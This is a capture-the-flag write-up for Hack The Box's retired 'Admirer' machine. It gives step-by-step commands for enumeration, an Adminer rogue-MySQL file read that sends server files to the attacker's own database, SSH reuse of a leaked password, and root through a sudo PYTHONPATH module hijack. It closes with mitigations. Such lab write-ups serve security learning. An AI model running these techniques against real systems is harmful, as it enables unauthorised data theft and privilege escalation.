---
machine: Admirer
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, ftp, adminer, lfi, pythonpath]
---

# Admirer — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

`robots.txt` points at a "hidden" directory holding FTP credentials. The site backup carries the old config, not the live one: the current `index.php` is read through **Adminer 4.6.2**'s LFI, using your own MySQL server to serve the file via `LOAD DATA LOCAL`. That yields the real password and SSH as `waldo`. Escalation is an inherited `PYTHONPATH` under `sudo`: the backup script imports `shutil` and resolves it from `/tmp`.

## Recon

```bash
nmap -sC -sV -p- <IP> -oN nmap.txt
```

```text
21/tcp  ftp     vsftpd 3.0.3
22/tcp  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp  http    Apache httpd 2.4.25 ((Debian))
```

`vsftpd 3.0.3` without `anon` is not the way in; the web is.

## Enumeration

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt
curl -s http://<IP>/robots.txt
```

```text
User-agent: *
Disallow: /admin-dir
```

`/admin-dir/` has no listing but does hold files:

- `contact.txt`: staff addresses (`waldo@admirer.htb`, `admin@admirer.htb`).
- `credentials.txt`: `ftpuser:<password>`.

```bash
ftp <IP>           # ftpuser + the password from the txt
ftp> passive
ftp> mget *
```

The FTP share yields `dump.tar.gz` and `html.tar.gz`. The latter matters:

```bash
tar -xzf html.tar.gz && tree -L 3
```

```text
html/
├── index.php
├── utility-scripts/
│   ├── admin_tasks.php
│   ├── db_admin.php
│   ├── info.php
│   └── phptest.php
└── w4ld0s_s3cr4t_d1r/
```

`db_admin.php` stores `w4ld0s` with the password for the `admirer` database. Those are **local** credentials: MySQL does not listen externally, so a direct login is impossible.

## Foothold

Fuzz the directory with extensions to find what the backup does not contain:

```bash
wfuzz -w /usr/share/wordlists/dirb/big.txt -u http://<IP>/admin-dir/FUZZ.php --hc 404
```

Out comes `adminer.php`, an **Adminer 4.6.2**. That version lets the MySQL server you connect to be yours, and when you open a table it serves `LOAD DATA LOCAL INFILE` with any path: the client (Adminer, on the victim) reads the file and sends it over.

```bash
# 1. Your own MySQL, listening on 0.0.0.0
mysql -u root
CREATE DATABASE rogue;
USE rogue;
CREATE TABLE t (data LONGTEXT);
# externally reachable user + bind-address = 0.0.0.0 in 50-server.cnf
```

```sql
-- 2. In Adminer, log in to <your IP>:3306, pick the table under "select"
LOAD DATA LOCAL INFILE '/var/www/html/index.php' INTO TABLE t;
SELECT * FROM t;
```

The live `index.php` no longer matches the tarball: it holds the password `waldo` reuses on the system.

```bash
ssh waldo@<IP>
```

## Escalation

```bash
sudo -l
```

```text
User waldo may run the following commands on admirer:
    (ALL) SETENV: NOPASSWD: /opt/scripts/admin_tasks.sh
```

`SETENV` is the key: it allows environment variables to be passed to the privileged process. The rule targets `admin_tasks.sh`, not `backup.py`; option 6 of its menu runs `backup.py`, which does `import shutil`, and Python resolves modules from `PYTHONPATH` before the standard library.

```bash
cat /opt/scripts/backup.py        # import shutil, make_archive(...)
echo 'import os; os.system("/bin/sh")' > /tmp/shutil.py
sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh   # option 6
```

```text
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Evidence (redacted)

```text
/etc/passwd  -> user waldo with /bin/bash
user.txt     -> <user_flag>
root.txt     -> <root_flag>
```

## Lessons

- A `Disallow` in `robots.txt` is a hint, not a control: it separates "do not index" from "do not access".
- Diffing a backup against the live state avoids chasing stale credentials; the LFI supplied the valid one.
- `NOPASSWD` plus `SETENV` equals code execution: any binary that loads libraries or modules from the environment is hijackable.
- Mitigation: drop `SETENV` from the sudo rule, use `secure_path` and `Defaults env_reset`, and never run the backup job as root.
